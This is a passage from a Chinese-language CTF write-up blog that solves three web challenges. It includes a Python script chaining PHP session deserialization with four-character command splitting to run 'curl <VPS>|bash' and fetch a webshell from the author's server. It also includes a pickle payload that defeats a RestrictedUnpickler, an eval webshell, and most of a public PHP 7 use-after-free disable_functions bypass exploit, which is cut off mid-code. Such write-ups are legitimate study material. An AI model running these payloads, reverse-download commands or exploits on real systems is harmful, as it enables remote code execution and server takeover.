href="https://www.anquanke.com/post/id/87203">绕过四字符限制getshell</a>，也就是通过把命令拆解成四字符一组来执行命令。</p><p>利用命令的执行到VPS上下载木马，然后我们就能拿到shell了！</p><h4 id="理一下解题思路"><a href="#理一下解题思路" class="headerlink" title="理一下解题思路"></a>理一下解题思路</h4><ul><li>1、利用PHP session的反序列化漏洞成为admin，读取<code>/core/index.php</code>关键代码</li><li>2、利用URL绕过姿势绕过对url的限制</li><li>3、利用<code>compress.zlib:</code>进行<code>file_get_contents</code>对文件的读取</li><li>4、绕过四字符限制getshell</li></ul><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>关于解题的第四步还是要好好说一下的，为了下载木马，我把自己的博客都删了…</p><p>因为是用<code>curl</code>命令来到VPS上读取木马的代码，因此在VPS上配置好木马文件很重要，做题的时候这里就卡了很久，这一步也需要在本地好好测试，保证木马文件能成功访问。</p><p>在VPS上配置好木马文件之后，就可以通过url传参通过四字符执行命令来下载木马，然后浏览器拿shell了。</p><p>完整的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://121.36.222.22:88/login.php"</span></span><br><span class="line">s.post(url, data=&#123;<span class="string">'name'</span>:<span class="string">'ggb0n'</span>&#125;)</span><br><span class="line">url1 = <span class="string">"http://121.36.222.22:88/?page=upload"</span></span><br><span class="line">s.post(url1, data=&#123;<span class="string">'sign'</span>:<span class="string">'ggb0n|O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:0:"";&#125;'</span>&#125;)</span><br><span class="line">url3 = <span class="string">"http://121.36.222.22:88/core/index.php"</span></span><br><span class="line">s.get(url3)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'xx.xx.xx.xx'</span></span><br><span class="line">ip = <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">'.'</span>)])</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># 将 "g&gt; ht- sl" 写到文件 "v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>, </span><br><span class="line">    <span class="string">'&gt;sl'</span>, </span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># 将文件"v"中的字符串倒序，放到文件"x"，就变成了 "ls -th &gt;g"</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash`</span></span><br><span class="line">    <span class="string">'&gt;p\ '</span>, </span><br><span class="line">    <span class="string">'&gt;ph\\'</span>, </span><br><span class="line">    <span class="string">'&gt;a.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">0</span>:<span class="number">2</span>], </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># getshell</span></span><br><span class="line">    <span class="string">'sh x'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload_all = <span class="string">'compress.zlib://data:@127.0.0.1/plain;base64,&#123;0&#125;'</span></span><br><span class="line">r = requests.get(url3)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:               </span><br><span class="line">    r = requests.post(url3,data=&#123;<span class="string">"url"</span>:payload_all.format(base64.b64encode(i))&#125;)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line">    print(data[<span class="string">'url'</span>])</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/gxctf03.png" alt=""></p><p>下载木马之后，浏览器拿shell：<br><img src="http://www.ggb0n.cool/images/gxctf04.png" alt=""></p><p>整理一下参考的文章：<br><a href="https://www.cnblogs.com/hf99/p/9746038.html">https://www.cnblogs.com/hf99/p/9746038.html</a><br><a href="https://xz.aliyun.com/t/6640#toc-10">https://xz.aliyun.com/t/6640#toc-10</a><br><a href="https://www.anquanke.com/post/id/87203">https://www.anquanke.com/post/id/87203</a></p><h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>考察pickle的反序列化利用</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目<br><img src="http://www.ggb0n.cool/images/gxctf05.png" alt=""></p><p>可以读源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, category)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f'Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> type(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">'__main__'</span>:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[<span class="string">'__main__'</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(filename, encoding=<span class="string">'utf-8'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'r'</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'source'</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">'text/plain'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">'data'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b'R'</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> type(result) <span class="keyword">is</span> <span class="keyword">not</span> Animal:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">'Are you sure that is an animal???'</span></span><br><span class="line">            correct = (result == Animal(secret.name, secret.category))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'unpickle_result.html'</span>, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Something wrong"</span></span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(<span class="string">'一给我哩giaogiao'</span>, <span class="string">'Giao'</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'unpickle_page.html'</span>, sample_obj=sample_obj, pickle_data=pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>基于flask的环境，并且采用了pickle</p><p>结合题目描述：</p><blockquote><p>Sample animal: Animal(name=’一给我哩giaogiao’, category=’Giao’)</p><p>Pickled data: gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA1gUAAAA5LiA57uZ5oiR5ZOpZ2lhb2dpYW9xBFgIAAAAY2F0ZWdvcnlxBVgEAAAAR2lhb3EGdWIu</p><p>I will give you the flag if we share the same animal as our favourite.</p></blockquote><p>可知，我们需要构造一个与题目<code>secret</code>中一样的<code>Animal</code>类才能拿到flag，命令执行是不能的，因为<code>R</code>被ban了，我们又不可能知道secret中<code>Animal</code>的属性值。</p><p>但是从<a href="https://www.anquanke.com/post/id/188981#h3-8">这篇文章</a>得到了提示：存在<code>b</code>这个指令（call __setstate__ or__dict__.update()），可以更新字典，这样的话我们就可以先覆盖<code>secret</code>中原有的值，然后写入我们构造的键值对到字典中，这样我们就可以再构造<code>Animal</code>类满足题目要求，成功拿到flag了。</p><p>参考上面那篇文章的指令集，构造了如下的序列化指令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c__main__\nsecret\np0\n(dp1\nS&#39;category&#39;\np2\nS&#39;ggb0n&#39;\np3\nsS&#39;name&#39;\np4\nS&#39;ggb0n&#39;\np5\nsb.</span><br></pre></td></tr></table></figure><p>注意这里的<code>\n</code>换行符，也是一个巨坑…刚开始在Windows下构造的payload的base64之后提交反馈<code>Somethin wrong</code>，后来经师傅提示说pickle对换行符的<code>\r</code>不能识别…涨知识…</p><p>两种方法：</p><ul><li>1、<code>字符串对象.replaceAll(&quot;\r&quot;, &quot;&quot;);</code></li><li>2、到Linux中去加密</li></ul><p>选择了去Linux中加密：<br><img src="http://www.ggb0n.cool/images/gxctf07.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#注意在Linux下</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"c__main__\nsecret\np0\n(dp1\nS'category'\np2\nS'ggb0n'\np3\nsS'name'\np4\nS'ggb0n'\np5\nsb."</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = base64.b64encode(s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">'Y19fbWFpbl9fCnNlY3JldApwMAooZHAxClMnY2F0ZWdvcnknCnAyClMnZ2diMG4nCnAzCnNTJ25hbWUnCnA0ClMnZ2diMG4nCnA1CnNiLg=='</span></span><br></pre></td></tr></table></figure><p>然后在本地生成个Animal对象：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, category)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Animal"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> type(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    a = Animal(<span class="string">'ggb0n'</span>,<span class="string">'ggb0n'</span>)</span><br><span class="line">    print(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>现将第一个payload的base64通过输入框提交反序列化执行覆盖字典，然后再提交我们构造的Animal对象的base64，即可拿到flag：<br><img src="http://www.ggb0n.cool/images/gxctf06.png" alt=""></p><p>参考文章：<br><a href="https://www.anquanke.com/post/id/188981#h3-8">https://www.anquanke.com/post/id/188981#h3-8</a><br><a href="http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/">http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/</a></p><h2 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a><strong>PHP-UAF</strong></h2><p>考察<code>functions_disable</code>的绕过，上次I春秋公益赛<code>easy_thinking</code>刚遇到的知识点，前两天在CTFHub上也在刷这方面的题。</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目直接给了小马：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"wdwd"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">    @<span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>先看一下<code>phpinfo</code>：<br><img src="http://www.ggb0n.cool/images/gxctf10.png" alt=""></p><p>是PHP 7版本的，有一个bypass代码可以用，在<a href="https://www.exploit-db.com/exploits/48072">这里</a>。</p><p>然后看一下<code>functions_disable</code>果然ban掉了很多函数：<br><img src="http://www.ggb0n.cool/images/gxctf11.png" alt=""></p><p>那么思路就有了：</p><ul><li>1、蚁剑连接，上传bypass脚本</li><li>2、浏览器访问，获取shell</li></ul><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>将如下的bypass脚本上传（上次的bypass脚本用不了…）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"uname -a"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="keyword">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">'args'</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span><span class="params">($arg)</span> </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        $arg = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">79</span>));</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">'x'</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">'args'</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span 